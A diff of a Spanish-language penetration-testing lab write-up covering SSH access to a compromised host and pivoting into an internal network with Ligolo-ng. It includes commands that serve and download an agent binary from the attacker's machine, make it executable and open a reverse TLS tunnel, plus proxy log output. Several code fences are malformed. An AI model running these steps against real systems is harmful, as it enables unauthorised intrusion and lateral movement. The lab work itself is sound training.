@@ -206,25 +206,10 @@ Se establece conexión con el sistema objetivo utilizando autenticación por cla
 
 ```bash
 ssh -i drzunder-id_rsa drzunder@10.10.10.2
-``` id="ssh-login"
-
-Durante la primera conexión, se acepta la huella del host remoto.
-
-
-### ✅ Validación de acceso
-
+```
 Una vez dentro, se verifica el contexto de ejecución:
 
-```bash
-whoami
-id
-hostname
-``` id="post-access"
-```
 ![Acceso SSH exitoso](https://github.com/user-attachments/assets/b6f1ac35-d7d2-4243-b1b5-dba87a78720f)
-
-![Flag de usuario](https://github.com/user-attachments/assets/1019411a-b979-4)
-
 
 
 ### 📌 Conclusión
@@ -238,3 +223,189 @@ La explotación de la vulnerabilidad permitió:
 
 Este punto representa un **acceso inicial completo**, habilitando fases posteriores como enumeración interna y técnicas de pivoting.
 
+## 🔀 Pivoting 1 (10.10.10.0/24 → 20.20.20.0/24)
+
+### 🧭 Identificación de doble interfaz (Dual-Homed)
+
+En esta fase se detecta que la máquina comprometida **"Hospital"** pertenece a **dos segmentos de red distintos**, lo que la convierte en un candidato ideal para realizar pivoting.
+
+La validación se realiza mediante la inspección del archivo `/etc/hosts`, donde se observa que el hostname está asociado a múltiples direcciones IP:
+
+```bash
+cat /etc/hosts
+```
+![Interfaces de red](https://github.com/user-attachments/assets/779ba088-88f5-42e1-a769-647dc194c184)
+
+Este comportamiento confirma que el sistema actúa como un nodo **dual-homed**, es decir, con conectividad simultánea a:
+
+- `10.10.10.0/24` (red inicial comprometida)  
+- `20.20.20.0/24` (red interna no accesible directamente)  
+
+---
+
+### 🎯 Objetivo del Pivoting
+
+Dado que ya se ha comprometido esta máquina, puede utilizarse como **primer pivote** para:
+
+- Enumerar la red interna (`20.20.20.0/24`)  
+- Descubrir nuevos activos  
+- Establecer rutas de acceso hacia sistemas inaccesibles desde el exterior  
+
+Este paso marca el inicio del **movimiento lateral real dentro del laboratorio**.
+
+---
+
+## ⚙️ Herramienta utilizada: Ligolo-ng
+
+Para esta fase se utiliza **Ligolo-ng**, una herramienta moderna y eficiente para tunneling y pivoting.
+
+🔗 Repositorio: https://github.com/Nicocha30/ligolo-ng  
+🔗 Releases: https://github.com/nicocha30/ligolo-ng/releases/tag/v0.8.2  
+
+---
+
+### 🚀 Características clave
+
+- Uso de interfaz **TUN** para redirección de tráfico  
+- Soporte de **tráfico IP completo** (no solo puertos)  
+- Compatible con herramientas nativas como:
+  - `nmap`
+  - `netexec`
+  - `curl`, etc.  
+- No requiere privilegios elevados en el host pivote  
+- Conexión reversa mediante **TLS** (evasión de restricciones)  
+- Simula acceso como si se estuviera dentro de la red interna  
+
+💡 Esto permite trabajar de forma transparente, sin necesidad de configuraciones complejas adicionales.
+
+---
+
+## 🧩 Arquitectura de Ligolo-ng
+
+Ligolo-ng se compone de dos elementos principales:
+
+### 🖥️ Proxy (Atacante)
+
+Se ejecuta en la máquina del operador y actúa como:
+
+- Centro de control de túneles  
+- Receptor de conexiones de agentes  
+- Gestor de sesiones y rutas  
+
+Permite:
+
+- Listar sesiones activas  
+- Configurar túneles  
+- Redirigir tráfico  
+
+---
+
+### 🛰️ Agente (Víctima / Pivote)
+
+Se ejecuta en la máquina comprometida (**Hospital**) y:
+
+- Establece conexión reversa TLS hacia el proxy  
+- Expone su red interna  
+- Permite pivotar hacia otros segmentos  
+
+---
+
+## ▶️ Inicialización del Proxy
+
+Una vez descargados los binarios correspondientes, se inicia el **proxy** en la máquina atacante.
+
+> ⚠️ Se recomienda ejecutar este proceso en una terminal separada y mantenerla activa durante toda la operación.
+
+```ruby
+sudo ./proxy -selfcert
+NFO[0000] Loading configuration file ligolo-ng.yaml    
+WARN[0000] Using default selfcert domain 'ligolo', beware of CTI, SOC and IoC! 
+INFO[0000] Listening on 0.0.0.0:11601                   
+INFO[0000] Starting Ligolo-ng Web, API URL is set to: http://127.0.0.1:8080 
+WARN[0000] Ligolo-ng API is experimental, and should be running behind a reverse-proxy if publicly exposed. 
+    __    _             __                       
+   / /   (_)___ _____  / /___        ____  ____ _
+  / /   / / __ `/ __ \/ / __ \______/ __ \/ __ `/
+ / /___/ / /_/ / /_/ / / /_/ /_____/ / / / /_/ / 
+/_____/_/\__, /\____/_/\____/     /_/ /_/\__, /                                                                                               
+        /____/                          /____/                                                                                                
+                                                                                                                                              
+  Made in France ♥            by @Nicocha30!                                                                                                  
+  Version: 0.8.3                                                                          
+
+- El proxy quedará a la escucha en el puerto **11601** por defecto  
+- Se utiliza un certificado autofirmado para la conexión TLS  
+```
+
+A## 🔗 Despliegue del Agente y Establecimiento del Túnel
+
+Una vez inicializado el **proxy**, el siguiente paso consiste en conectar la máquina comprometida (**Hospital**) mediante el agente de Ligolo-ng.
+
+Para ello, es necesario transferir el binario del agente al sistema objetivo, asignarle permisos de ejecución y establecer una conexión reversa hacia el proxy.
+
+---
+
+### 📦 Transferencia del agente
+
+Desde la máquina atacante, se levanta un servidor HTTP temporal para facilitar la transferencia del binario:
+
+```bash
+python3 -m http.server 80
+``` id="http-server"
+```
+---
+
+### 📥 Descarga y preparación en la máquina pivote
+
+En la máquina comprometida:
+
+```bash
+cd /tmp
+wget http://10.10.10.1/agent
+ls -al agent
+chmod +x agent
+``` id="agent-setup"
+```
+
+### 🚀 Ejecución del agente
+
+Se ejecuta el agente indicando la dirección del proxy y deshabilitando la verificación del certificado:
+
+```bash
+./agent -connect 10.10.10.1:11601 -ignore-cert
+``` id="agent-run"
+
+![Ejecución del agente](https://github.com/user-attachments/assets/7c66e9a8-b0f6-4535-8343-27a87fde8951)
+```
+---
+
+### 📡 Verificación de la conexión
+
+Tras la ejecución, el agente establece una conexión reversa hacia el proxy. Desde la consola del proxy, se puede confirmar que la sesión ha sido registrada correctamente:
+
+```bash
+ligolo-ng » INFO[...] Agent joined. id=02420a0a0a02 name=drzunder@489a833a8b7e remote="10.10.10.2:53694"
+``` id="agent-check"
+```
+![Conexión recibida en el proxy](https://github.com/user-attachments/assets/fa81e50f-c72d-43e5-8b7b-7bc60768e6d7)
+
+
+### 📌 Resultado
+
+En este punto:
+
+- ✅ El agente se encuentra activo en la máquina pivote  
+- ✅ El proxy ha registrado la sesión correctamente  
+- ✅ Se ha establecido un canal de comunicación seguro (TLS)  
+
+---
+
+### 🧠 Conclusión
+
+La conexión del agente marca un punto clave en el proceso de pivoting:
+
+- Se habilita el acceso a la red interna desde la máquina atacante  
+- Se establece la base para el enrutamiento de tráfico  
+- Se permite interactuar con la red `20.20.20.0/24` como si se estuviera dentro de ella  
+
+El siguiente paso consistirá en configurar la interfaz TUN y comenzar la enumeración de la red interna.
